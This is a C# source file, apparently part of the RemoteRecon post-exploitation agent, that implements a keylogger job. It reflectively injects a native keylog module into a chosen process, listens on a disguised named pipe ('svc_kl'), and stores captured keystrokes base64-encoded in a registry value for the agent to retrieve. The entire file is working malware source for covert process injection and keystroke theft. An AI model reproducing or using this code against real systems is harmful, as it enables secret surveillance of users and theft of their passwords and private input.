using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using ReflectiveInjector;
using System.Runtime.InteropServices;
using System.Security.AccessControl;

namespace RemoteReconCore
{
    public class Keylogger : IJobs
    {
        private int targetPid;
        public Keylogger(int pid)
        {
            targetPid = pid;
        }

        public KeyValuePair<int, string> Run()
        {
            byte[] keylogMod = Agent.PatchRemoteReconNative("keylog", toReplace);
            Injector keylog = new Injector(targetPid, keylogMod);
            if (!keylog.Inject())
                return new KeyValuePair<int, string>(2, "Failed to inject keylogger");
            else
            {
#if DEBUG 
                Console.WriteLine("Injected Keylogger");
#endif
                try
                {
                    //Start the named pipe server and keylog listener in the background
                    Agent.thr = new Thread(() =>
                    {
                        ReceiveKeyStrokes();
                    });
                    Agent.thr.SetApartmentState(ApartmentState.STA);
                    Agent.thr.IsBackground = true;
                    Agent.thr.Start();
#if DEBUG
                    Console.WriteLine("Started background thread to sync keylogger");
#endif
                    string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Keylogger successfully started"));
                    return new KeyValuePair<int, string>(0, msg);
                }
                catch (Exception)
                {
                    string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Keylog background thread failed to start"));
                    return new KeyValuePair<int, string>(2, msg);
                }
                
            }
            
        }

        private void ReceiveKeyStrokes()
        {
            string enc = "";

            try
            {
                //Used PInvoke here instead of the IO.Pipes class because that class does not have a PeekNamedPipe method
                IntPtr sa = WinApi.CreateNullDescriptorPtr();
                hPipe = WinApi.CreateNamedPipe(@"\\.\pipe\svc_kl",
                                               WinApi.PIPE_ACCESS_INBOUND,
                                               (WinApi.PIPE_READMODE_BYTE | WinApi.PIPE_WAIT),
                                               1,
                                               0,
                                               1024,
                                               10000,
                                               sa);
#if DEBUG
                Console.WriteLine("Waiting for client to connect");
#endif
                //Blocking call to wait for a client to connect
                WinApi.ConnectNamedPipe(hPipe, IntPtr.Zero);
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine(e.ToString());
#endif
                string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
                Agent.rrbase.SetValue(Agent.modkey, msg);
            }
            
            
#if DEBUG
            Console.WriteLine("Received connection from client");
            Console.WriteLine("Starting loop");
#endif
            while(Agent.keylogRun)
            {
                
                Thread.Sleep(1000);

                //Check to make sure the pipe is connected
                if (WinApi.ConnectNamedPipe(hPipe, IntPtr.Zero) == false && (uint)Marshal.GetLastWin32Error() != WinApi.ERROR_PIPE_CONNECTED)
                    break;

                //Variables for PeekNamedPipe and ReadFile
                byte[] readBuff = new byte[1024];
                uint bytesRead = 0;
                uint bytesAvail = 0;
                uint bytesLeft = 0;
                uint read = 0;
                string oldVal = "";
                
                
                try
                {
                    //Check if there is data to read in the pipe
                    if (!WinApi.PeekNamedPipe(hPipe, null, 0, ref bytesRead, ref bytesAvail, ref bytesLeft) && bytesAvail == 0)
                        continue;
                    //If we can't read for some reason, continue
                    if (!WinApi.ReadFile(hPipe, readBuff, (uint)readBuff.Length, ref read, IntPtr.Zero))
                        continue;

                    string ks = Encoding.UTF8.GetString(readBuff);

                    ks = ks.TrimEnd(new char[] { '\0'});
#if DEBUG
                    Console.Write(ks);
#endif
                    //Append the newly recorded keystrokes to the old value that was stored in the registry
                    oldVal = Encoding.ASCII.GetString(Convert.FromBase64String((string)Agent.rrbase.GetValue(Agent.kkey)));
                    oldVal = oldVal + ks;
                    enc = Convert.ToBase64String(Encoding.UTF8.GetBytes(oldVal));
                }
                catch (Exception e)
                {
                    enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
#if DEBUG
                    Console.WriteLine("Error: \n" + e.ToString());
#endif
                }

                Agent.rrbase.SetValue(Agent.kkey, enc);
            }

#if DEBUG
            Console.WriteLine("Client disconnected");
#endif
            if (!WinApi.DisconnectNamedPipe(hPipe))
                Agent.rrbase.SetValue(Agent.modkey, Convert.ToBase64String(Encoding.ASCII.GetBytes("Unable to disconnect named pipe server")));

            WinApi.CloseHandle(hPipe);
            
        }

        private string toReplace = "Replace-Me  ";
        private IntPtr hPipe;
    }
}
